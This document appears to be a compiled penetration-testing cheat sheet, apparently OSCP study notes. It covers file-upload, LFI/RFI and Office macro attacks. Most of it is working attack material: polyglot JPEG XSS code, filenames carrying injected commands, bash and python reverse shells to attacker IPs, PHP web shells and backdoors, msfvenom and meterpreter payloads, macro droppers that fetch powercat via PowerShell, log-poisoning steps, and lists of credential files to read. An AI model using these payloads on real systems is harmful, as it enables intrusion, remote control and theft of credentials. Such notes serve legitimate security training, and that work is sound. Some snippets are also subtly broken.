<h3 id="4-insert-our-javascript-into-jpeg-file"><a class="header" href="#4-insert-our-javascript-into-jpeg-file"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#4.-insert-our-javascript-into-jpeg-file">4. Insert Our JavaScript into JPEG File</a></a></h3>
<p>Now start inserting our payload.<br />
First we replace <code>00 10</code> after <code>FF D8 FF E0</code> with our <code>2F 2A (/*)</code>.</p>
<pre><code class="language-bash">FF D8 FF E0 2F 2A 4A 46 49 46 00 01 01 01 00 48 00 ...
</code></pre>
<p>By this, the length of the JPEG header is <strong>12074 bytes</strong> (<code>0x2F2A</code> in decimal).</p>
<p>Since the size of our payload is <strong>19 bytes</strong> as below:</p>
<pre><code class="language-bash">python3
&gt;&gt;&gt; payload = b'*/=alert("test");/*'
&gt;&gt;&gt; len(payload)
19
</code></pre>
<p>We need to pad out the remaining <strong>12042 bytes</strong> (<strong>12074 - 16 - 19</strong>) with nulls.<br />
Below is the Python code example to generate a polyglot JPEG file, which refers to <a href="https://github.com/simplylu/jpeg_polyglot_xss/blob/main/exploit.py">https://github.com/simplylu/jpeg_polyglot_xss/blob/main/exploit.py</a>.</p>
<pre><code class="language-python">payload = b'*/=alert("test");/*'
input_file = 'evil_original.jpg'
output_file = 'evil.jpg'

a = open(input_file, 'rb').read()

# Get the length of the header
header_size = int(a.hex()[8:12], 16)
new_header_size = int(payload.hex()[2:4]+payload.hex()[:2], 16)

# Calculate the size of nulls for padding
null_size = new_header_size - header_size - 16

# Get start and end
start = a[:40]
end = a.hex()[40:]
end = bytearray([int(end[i:i+2], 16) for i in range(0, len(end), 2)])

res = start + (null_size * b'\x00') + payload + end

with open(output_file, 'wb') as f:
	f.write(res)
</code></pre>
<h3 id="5-xss-with-this-jpeg"><a class="header" href="#5-xss-with-this-jpeg"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#5.-xss-with-this-jpeg">5. XSS with this JPEG</a></a></h3>
<p>Inject XSS to make our JPEG to execute JavaScript code. We need to set <code>charset</code> to <code>ISO-8859-1</code> for executing that.</p>
<pre><code class="language-bash">&lt;script charset="ISO-8859-1" src="evil.jpg"&gt;
</code></pre>
<h2 id="malicious-filnames"><a class="header" href="#malicious-filnames"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#malicious-filnames">Malicious Filnames</a></a></h2>
<h3 id="command-injection"><a class="header" href="#command-injection"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#command-injection">Command Injection</a></a></h3>
<pre><code class="language-bash"># If the response comes after 10 seconds, the command injection is successful.
test.jpg;sleep 10
test.jpg;sleep+10
test.jpg;sleep 10#
test.jpg;sleep 10%00
test.jpg|sleep 10
test.jpg%0Asleep 10
;sleep 10 test.jpg

# Reverse Shell
test.jpg;bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1
</code></pre>
<h3 id="php-injection"><a class="header" href="#php-injection"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#php-injection">PHP Injection</a></a></h3>
<pre><code class="language-html">&lt;?php echo system('id');?&gt;.jpg
"&gt;&lt;?php echo system('id');?&gt;.jpg
</code></pre>
<h3 id="xss"><a class="header" href="#xss"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#xss">XSS</a></a></h3>
<pre><code class="language-html">&lt;script&gt;alert(1)&lt;/script&gt;.jpg
"&gt;&lt;script&gt;alert(1)&lt;/script&gt;.jpg
</code></pre>
<h3 id="ssti"><a class="header" href="#ssti"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#ssti">SSTI</a></a></h3>
<pre><code class="language-html">{{2*3}}.jpg
{2*3}.jpg
2*3.jpg
2*3}}.jpg
2*3}.jpg
${2*3}.jpg
"{{2*3}}.jpg
</code></pre>
<h3 id="truncation"><a class="header" href="#truncation"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#truncation">Truncation</a></a></h3>
<pre><code class="language-bash">xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxtest.jpg
test.jpgxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
</code></pre>
<h3 id="html-injection"><a class="header" href="#html-injection"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#html-injection">HTML Injection</a></a></h3>
<p>Try to upload the file which includes <strong>HTML tags</strong> in the filename. It may affect the web page.</p>
<pre><code class="language-html">&lt;h1&gt;test.jpg

&lt;!-- `&amp;sol;`: HTML entiry for '/' --&gt;
"&gt;&lt;iframe src="http:&amp;sol;&amp;sol;10.0.0.1"&gt;.jpg

"&gt;&lt;img src=x onerror=alert(document.domain).jpg

"&gt;&lt;form action="//evil.com" method="GET"&gt;&lt;input type="text" name="username" style="opacity:0;"&gt;&lt;input type="password" name="password" style="opacity:0;"&gt;&lt;input type="submit" name="submit" value="submit"&gt;&lt;!--.jpg
</code></pre>
<h3 id="sql-injection-1"><a class="header" href="#sql-injection-1"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#sql-injection">SQL Injection</a></a></h3>
<p>Try to upload the file which includes <strong>SQL command</strong> in the filename. It may execute <strong>SQL Injection</strong> when uploading or other situations.</p>
<pre><code class="language-txt">--sleep(10).jpg
</code></pre>
<h2 id="race-condition-attack"><a class="header" href="#race-condition-attack"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#race-condition-attack">Race Condition Attack</a></a></h2>
<p>We might be able to bypass/execute payload using race condition.<br />
We can easily achieve that with <strong>Turbo Intruder</strong> in <strong>Burp Suite</strong>.</p>
<pre><code class="language-python">def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                        concurrentConnections=10,)

    request_post = '''POST /avatar/upload HTTP/1.1
Host: vulnerable.com
...
...
Connection: close

------abcdefghi
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

&lt;?php echo file_get_contents('/etc/passwd');  ?&gt;

------abcdefghijk--

'''

    request_get = '''GET /files/avatars/exploit.php HTTP/1.1
Host: vulnerable.com
...
...
Connection: close


'''

    engine.queue(request_post, gate='race1')
    for i in range(5):
        engine.queue(request_get, gate='race1')


    engine.openGate('race1')
    engine.complete(timeout=60)
    


def handleResponse(req, interesting):
    table.add(req)
</code></pre>
<h2 id="php-payloads"><a class="header" href="#php-payloads"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#php-payloads">PHP Payloads</a></a></h2>
<p>After finding vulnerability, we can create a payload for exploiting the website.<br />
Here is the example payloads of <strong>web shell</strong> and <strong>reverse shell</strong> to compromise target system.</p>
<h3 id="web-shell"><a class="header" href="#web-shell"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#web-shell">Web Shell</a></a></h3>
<p>For example, the file name is "exploit.php".</p>
<pre><code class="language-php">// Simply showing the result of 'whoami'.
&lt;?php echo system('whoami'); ?&gt;

// This shows the content of "/etc/passwd".
&lt;?php echo file_get_contents('/etc/passwd');  ?&gt;

// We can execute arbitrary commands by passing the url parameter e.g. "/exploit.php?cmd=whoami"
&lt;?php echo system($_GET['cmd']); ?&gt;
</code></pre>
<h3 id="reverse-shell-for-linux"><a class="header" href="#reverse-shell-for-linux"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#reverse-shell-for-linux">Reverse Shell for Linux</a></a></h3>
<pre><code class="language-sh">wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php
# or
cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php

# Edit some variables in the payload
$ip = '&lt;attacker-ip&gt;'
$port = 4444
</code></pre>
<p>Or we might be able to use the following simple script.</p>
<pre><code class="language-php">&lt;?php shell_exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1'"); ?&gt;
</code></pre>
<p>Then open listener for getting a shell.</p>
<pre><code class="language-sh">nc -lvnp 4444
</code></pre>
<p>After uploading it, reload the page in which the payload uploaded e.g. <code>"/upload/shell.php"</code>.</p>
<h3 id="reverse-shell-for-windows"><a class="header" href="#reverse-shell-for-windows"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#reverse-shell-for-windows">Reverse Shell for Windows</a></a></h3>
<p>First create a malicious executable file using msfvenom.<br />
Replace <strong>10.0.0.1</strong> with your local ip.</p>
<pre><code class="language-sh"># -f: Format
# -p: Payload
# -o: Output file
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o cv-username.exe
</code></pre>
<p>Next start a listener for getting the target shell.</p>
<pre><code class="language-sh"># -x: Execute command
sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; exploit"
</code></pre>
<p>After getting the shell, we will get in the meterpreter, so we need to know the meterpreter’s commands. To get a list of command, run the following in the meterpreter.</p>
<pre><code class="language-sh"># Usage command
meterpreter&gt; ?
</code></pre>
<h2 id="other-tips"><a class="header" href="#other-tips"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#other-tips">Other Tips</a></a></h2>
<h3 id="craft-upload-request"><a class="header" href="#craft-upload-request"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#craft-upload-request">Craft Upload Request</a></a></h3>
<p>If website does not display the upload page but such functionality exists on the website, we can manually create the uploading request.<br />
First off, we need to set <strong><code>multipart/form-data; boundary=&lt;arbitrary_characters&gt;</code></strong> to <strong>Content-Type</strong> in <strong>HTTP headers</strong> as below.<br />
Of course we need to specify the <strong>POST</strong> method at the top of the header.</p>
<pre><code class="language-html">Content-Type: multipart/form-data; boundary=abcdef
</code></pre>
<p>Then we can surround <strong>POST body (to upload file)</strong> with this boundary as the following.</p>
<pre><code class="language-html">--abcdef
Content-Disposition: form-data; name="profile"; filename="test.png"
Content-Type: image/jpeg

some code here...
--abcdef--
</code></pre>
<h2 id="polyglot-attack"><a class="header" href="#polyglot-attack"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack-on-exiftool/#polyglot-attack">Polyglot Attack</a></a></h2>
<p>We might be able to execute remote code by polyglotting the original plain image file.<br />
At first, create a blank image file as below, but this step may be not required if you already have some image file.</p>
<pre><code class="language-sh">convert -size 32x32 xc:white test.jpg
</code></pre>
<p>Then insert <strong>OS command</strong> with <strong>exiftool</strong>.</p>
<pre><code class="language-sh">exiftool -Comment="&lt;?php system('ls'); ?&gt;" example.png
exiftool -Comment='&lt;?php echo "&lt;pre&gt;"; system($_GET['cmd']); ?&gt;' exploit.png
exiftool -Comment="&lt;?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?&gt;" example.jpg -o polyglot.php
</code></pre>
<h2 id="command-injection-version--v1238"><a class="header" href="#command-injection-version--v1238"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack-on-exiftool/#command-injection-(version-%3C-v12.38)">Command Injection (version &lt; v12.38)</a></a></h2>
<p>On Exiftool version lower than <strong>12.38</strong>, we can inject <strong>OS command</strong> in the filename when uploading.</p>
<pre><code class="language-bash"># Ping
filename="touch test; ping -c 1 10.0.0.1 |"

# Reverse shell
filename="touch test; bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1 |"
filename="touch test; bash -c \"bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1\" |"
filename="touch test; python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.0.0.1\", 1234));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")' |"
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="html-file-upload"><a class="header" href="#html-file-upload">HTML File Upload</a></h2>
<p>If a file is created with the extension of <em><strong>.hta</strong></em> instead of <em><strong>.html</strong></em>, Internet Explorer will automatically interpret it as an HTML Application and offer the ability to execute it using the mshta.exe program. This attack only works for Internet Explorer.</p>
<pre><code># Crafting a payload and listener
msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;port&gt; -f hta-psh -o evil.hta
nc -lnvp 4444
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="macros"><a class="header" href="#macros">Macros</a></h2>
<h3 id="manual-method"><a class="header" href="#manual-method">Manual Method</a></h3>
<pre><code>Open Word Document → View → Macros → Macro Name: MyMacro → Macros in: Document(1) → Create
Save it in only .docm or .doc format .docx is not supported.

# Paste this Snippet in Macro.
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String

    CreateObject("Wscript.Shell").Run Str
End Sub
# Save as Word 97-2003 Document Template
</code></pre>
<p>One more step is having Split Powershell one-liner for the reverse shell, so we have 3 step process:</p>
<pre><code>1) msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;port&gt; -f hta-psh -o evil.hta
# read evil.hta and copy the powershell.exe string 

2) Put the Powershell script in a Python code below for splitting
str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC....."

n = 50

for i in range(0, len(str), n):
	print "Str = Str + " + '"' + str[i:i+n] + '"'

3) Copy the split and paste it in Macro (below Dim str and above CreateObject)
</code></pre>
<h3 id="metasploit-1"><a class="header" href="#metasploit-1">Metasploit</a></h3>
<ol>
<li>
<p>Follow the First 4 Steps with the below's reference: <a href="https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/fileformat/office_word_macro.md">https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/fileformat/office_word_macro.md</a></p>
</li>
<li>
<p>got the doc.m file? convert it to a doc
Usuall, Word files containing macros use the .docm extension. However, it's possible to rename the file by changing the file extension and still keep their macro executing capabilities.</p>
</li>
<li>
<p>Upload the doc file to the attacker’s FTP or somewhere with the payload</p>
</li>
</ol>
<pre><code>use exploit/multi/fileformat/office_word_macro
set payload windows/shell_reverse_tcp
set lhost and lport
Open a listener and pop up a reverse shell.
</code></pre>
<h3 id="macro-example"><a class="header" href="#macro-example">Macro Example</a></h3>
<pre><code>If possible do a powershell reverse shell base 64 encoded:

IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell


A for-loop iterates over the PowerShell command and prints each chunk in the correct format for our macro. 

str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..." n = 50 
for i in range(0, len(str), n): 
	print("Str = Str + " + '"' + str[i:i+n] + '"')

Sub AutoOpen() 
	MyMacro 
End Sub 
Sub Document_Open() 
	MyMacro 
End Sub 
Sub MyMacro() 
	Dim Str As String 
	Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU" 
	Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd" 
	Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB" ... 
	Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA" 
	Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA" 
	Str = Str + "A== " 
	CreateObject("Wscript.Shell").Run Str 
End Sub
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="ole"><a class="header" href="#ole">OLE</a></h2>
<h3 id="ole-1"><a class="header" href="#ole-1">OLE</a></h3>
<p>Object Linking and Embedding - Embed a Windows Batch file in a Microsoft Word Document.</p>
<pre><code># Cat evil.hta and Copy the Powershell string only base 64 encoded strings.
1) msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;port&gt; -f hta-psh -o evil.hta

# On Windows, open the terminal and put the PowerShell string
2) START &lt;powershell.exe -nop -w hidden -e ..... &gt; launch.bat

3) Open Word Document -&gt; Insert -&gt; Object (In right side Taskbar) -&gt; Create from File 
-&gt; Location of bat file from above -&gt; Select Display as icon (Change appearance - Optional)
-&gt; OK -&gt; Save as Word 97-2003 Document.

# Start a nc listener
nc -nlvp &lt;PORT&gt;

-&gt; Wait for the attacker to open Word and double-click the Object.
</code></pre>
<pre><code># Above one works well when served Locally, but if we provide it through email or server,
# We need to bypass Protected View protection which can disable Macros/Objects.
# Use Microsoft Publisher Instead of Microsoft Word document to bypass it.
# Downside is, it's not installed on most systems.
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="lfi--rfi"><a class="header" href="#lfi--rfi">LFI / RFI</a></h2>
<p>ON OSCP, if you are able to find LFI anywhere, hunt down the SSH keys first</p>
<h3 id="links-7"><a class="header" href="#links-7">Links</a></h3>
<ul>
<li><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html">Total OSCP Guide</a></li>
<li><a href="https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/">Payloads All The Things</a></li>
<li><a href="https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601">LFI Medium Article</a></li>
</ul>
<h3 id="quick-notes-1"><a class="header" href="#quick-notes-1">Quick Notes</a></h3>
<pre><code>Directory Traversal

Curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log

 

LFI

Curl http://mountaindesserts.com/meteor/index.php?page=data://text/plain,&lt;?php%20echo%20system('ls');?&gt;

Use Curl to POST file upload:
https://medium.com/@petehouston/upload-files-with-curl-93064dcccc76
 
curl -i -L -X POST -H "Content-Type: multipart/form-data" -F "file=@test.txt" -F filename="/home/alfredo/test.txt" http://192.168.233.249:33414/file-upload


PHP Wrapper

Curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php

Curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php

 

RFI

Curl http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simplebackdoor.php&amp;cmd=ls

 

Command Injection:

curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
</code></pre>
<h3 id="local-file-inclusion"><a class="header" href="#local-file-inclusion">Local File Inclusion:</a></h3>
<ol>
<li>Check if you can convert LFI to RFI</li>
<li>Try adding %00 to bypass the added extension on the server side. (Works on PHP &lt; 5.3)</li>
<li>You can even add? to bypass it.</li>
<li>If you can't read php files: <strong>php://filter/convert.base64-encode/resource=index</strong></li>
<li>Try reading important files from the system other than <strong>passwd.</strong> Enumeration might help in determining which files might be important. Maybe try checking the config files for the web app</li>
</ol>
<h3 id="windows-files"><a class="header" href="#windows-files">WINDOWS FILES</a></h3>
<pre><code>c:/boot.ini
c:/inetpub/logs/logfiles
c:/inetpub/wwwroot/global.asa
c:/inetpub/wwwroot/index.asp
c:/inetpub/wwwroot/web.config
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system32/inetsrv/metabase.xml
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system volume information/wpsettings.dat
c:/system32/inetsrv/metabase.xml
c:/unattend.txt
c:/unattend.xml
c:/unattended.txt
c:/unattended.xml
c:/windows/repair/sam
c:/windows/repair/system
</code></pre>
<h3 id="linux-files"><a class="header" href="#linux-files">LINUX FILES</a></h3>
<pre><code>/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ
/proc/version
/proc/cmdline
/proc/sched_debug
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/proc/self/cwd/index.php
/proc/self/cwd/main.py
/home/$USER/.bash_history
/home/$USER/.ssh/id_rsa
/var/run/secrets/kubernetes.io/serviceaccount
/var/lib/mlocate/mlocate.db
/var/lib/mlocate.db
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/resource=/etc/passwd
</code></pre>
<h3 id="log-files"><a class="header" href="#log-files">LOG FILES</a></h3>
<pre><code>/var/log/apache/access.log
/var/log/apache/error.log
/var/log/httpd/error_log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/vsftpd.log
/var/log/sshd.log
/var/log/mail
</code></pre>
<h3 id="rfi"><a class="header" href="#rfi">RFI</a></h3>
<pre><code>file=data:text/plain,hello world
file=data:text/plain,&lt;?php echo shell_exec("dir") ?&gt;
</code></pre>
<h3 id="lfi-and-rfi-examples"><a class="header" href="#lfi-and-rfi-examples">LFI and RFI Examples</a></h3>
<pre><code>http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/a pache2/access.log&amp;cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22

w/php wrapper:

curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php

curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64encode/resource=admin.php

curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,&lt;?php%20echo%20system('ls');?&gt;"

echo -n '&lt;?php echo system($_GET["cmd"]);?&gt;' | base64
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&amp;cmd=ls"

</code></pre>
<p><img src="FileInclusionExample.png" alt="File Inclusion Example" /></p>
<h3 id="remote-file-inclusion"><a class="header" href="#remote-file-inclusion">Remote File Inclusion</a></h3>
<pre><code>//Simple PHP backdoor
&lt;?php 
if(isset($_REQUEST['cmd'])){ 
	echo "&lt;pre&gt;"; $cmd = ($_REQUEST['cmd']); 
	system($cmd); echo "&lt;/pre&gt;"; die;
?}&gt;

Then:

python3 -m http.server 80
curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simplebackdoor.php&amp;cmd=ls"


</code></pre>
<h3 id="command-injection-1"><a class="header" href="#command-injection-1">Command Injection</a></h3>
<pre><code>
curl -X POST --data 'Archive=git' http://192.168.50.189:8000/archive

curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive

(dir 2&gt;&amp;1 *`|echo CMD);&amp;&lt;# rem #&gt;echo PowerShell
curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive

try system access with power cat:
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 80
nc -nvlp 4444

*This encoded: ```
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
```*
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive



</code></pre>
<h3 id="notes-from-htb-streamio-for-lfi"><a class="header" href="#notes-from-htb-streamio-for-lfi">Notes from HTB StreamIO for LFI</a></h3>
<pre><code>If you see this, maybe you can LFI: **?user=**

Fuzz it:
ffuf -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u https://streamio.htb/admin/index.php?message=FUZZ -b PHPSESSID=8ldbs678ajgeum49okb767249a -fs 1678

ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u https://streamio.htb/admin/index.php?FUZZ= -b PHPSESSID=8ldbs678ajgeum49okb767249a -fs 1678

ffuf -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u https://streamio.htb/admin/index.php?debug=FUZZ -b PHPSESSID=8ldbs678ajgeum49okb767249a -fs 1712


ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -u https://streamio.htb/admin/FUZZ.php -b PHPSESSID=8ldbs678ajgeum49okb767249a



Also worth noting here, once we figured out we could do LFI via the include command, I used burp to repeat, changed from GET to POST, and added the include line at the end, but still needed to also manually add the Content:type line:

POST /admin/index.php?debug=master.php HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=9acr1fp7e2rjcfnhgat8l8hnfs
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

include=http://10.10.14.76/rce.php
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="1-local-file-inclusion"><a class="header" href="#1-local-file-inclusion">1 Local File inclusion</a></h1>
<hr />
<ul>
<li>
<p>linux:</p>
<pre><code>    https://insecure-website.com/loadImage?filename=../../../etc/passwd
</code></pre>
</li>
<li>
<p>windows</p>
<pre><code>http://target.com/?page=c:\windows\system32\drivers\etc\hosts
http://webserver:ip/index.html?../../../../../boot.ini

</code></pre>
</li>
</ul>
<h3 id="log-poisoning"><a class="header" href="#log-poisoning">Log Poisoning</a></h3>
<ul>
<li>
<p>web log poisoning</p>
<pre><code>nc 10.10.10.14 80
&lt;?php echo '&lt;pre&gt;' . shell_exec($_GET['cmd'])  . '&lt;/pre&gt;'; ?&gt;
</code></pre>
</li>
<li>
<p><strong>linux</strong></p>
<pre><code>curl http://10.10.0.1/addguestbook.php?name=Test&amp;comment=Which+lang%3F&amp;cmd=ipconfig&amp;LANG=../../../../../../../xampp/apache/logs/access.log%00&amp;Submit=Submit
</code></pre>
</li>
<li>
<p><strong>windows</strong></p>
<pre><code>curl http://10.10.10.14/menu.php?file=c:\xamp\apache\logs\access.log&amp;cmd=ls
</code></pre>
</li>
</ul>
<h3 id="ssh-log-posioning"><a class="header" href="#ssh-log-posioning">SSH log posioning</a></h3>
<p>http://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/</p>
<h3 id="mail-log"><a class="header" href="#mail-log">Mail log</a></h3>
<p>LFI /var/mail/</p>
<pre><code>telnet &lt;IP&gt; 25  
EHLO &lt;random character&gt;  

VRFY &lt;user&gt;@localhost  

mail from:attacker@attack.com  
rcpt to: &lt;user&gt;@localhost  
data  

Subject: title  

&lt;?php echo system($_REQUEST[cmd]); ?&gt;  

&lt;end with .&gt;  

</code></pre>
<h1 id="2-remote-file-inclusion"><a class="header" href="#2-remote-file-inclusion">2 Remote File Inclusion</a></h1>
<hr />
<p>requires allow_url_fopen=On and allow_url_include=On</p>
<pre><code>
$incfile = $_REQUEST["file"];  
include($incfile.".php");  

</code></pre>
<ul>
<li>
<p><strong>original</strong></p>
<pre><code>http://10.10.0.1/addguestbook.php?name=Test&amp;comment=Which+lang%3F&amp;LANG=FR&amp;Submit=Submit
</code></pre>
</li>
<li>
<p><strong>modified</strong></p>
<pre><code>http://10.10.0.1/addguestbook.php?name=Test&amp;comment=Which+lang%3F&amp;LANG=http://10.10.10.10./evil.php&amp;Submit=Submit
</code></pre>
</li>
</ul>
<p>We will surely have a problem trying to execute evil.txt.php, so we can use a nullbyte so that the .php does not appear</p>
<pre><code>10.10.0.1/addguestbook.php?name=Test&amp;comment=Which+lang%3F&amp;LANG=http://10.10.10.10./evil.php%00&amp;Submit=Submit
</code></pre>
<h2 id="web-shell-rfi"><a class="header" href="#web-shell-rfi">web shell rfi</a></h2>
<pre><code>cat shell.php
&lt;?=`$_GET[0]`?&gt;
</code></pre>
<pre><code>http://10.10.10.151/blog/?lang=//10.10.14.23/Public/shell.php&amp;0=dir
</code></pre>
<h1 id="3-common-obstacles"><a class="header" href="#3-common-obstacles">3 Common obstacles</a></h1>
<hr />
<ul>
<li>
<p>just the path</p>
<pre><code>    filename=/etc/passwd
</code></pre>
</li>
<li>
<p>stripped non recursive</p>
<pre><code>filename=....//....//....//etc/passwd
</code></pre>
</li>
<li>
<p>encoding</p>
<pre><code> filename=..%252f..%252f..%252fetc/passwd
</code></pre>
</li>
<li>
<p>validation of start path</p>
<pre><code> filename=/var/www/images/../../../etc/passwd
</code></pre>
</li>
<li>
<p>add nullbyte</p>
<pre><code> filename=..%252f..%252f..%252fetc/passwd%00
</code></pre>
</li>
</ul>
<h1 id="4-common-lfi-to-rce"><a class="header" href="#4-common-lfi-to-rce">4 common LFI to RCE</a></h1>
<hr />
<h2 id="1-using-file-upload-formsfunctions"><a class="header" href="#1-using-file-upload-formsfunctions">1. Using file upload forms/functions</a></h2>
<p>upload a shell, then</p>
<pre><code>http://example.com/index.php?page=path/to/uploaded/file.php
</code></pre>
<h2 id="2-using-the-php-wrapper-expectcommand"><a class="header" href="#2-using-the-php-wrapper-expectcommand">2. Using the PHP wrapper expect://command</a></h2>
<p>if the app use an include:</p>
<pre><code>&lt;?php  
include $_GET['page'];  
?&gt;  
</code></pre>
<pre><code>http://target.com/index.php?page=expect://whoami  
</code></pre>
<h2 id="3-using-php-wrapper-file"><a class="header" href="#3-using-php-wrapper-file">3. Using php wrapper file://</a></h2>
<pre><code>http://localhost/include.php?page=file:///path/to/file.ext
</code></pre>
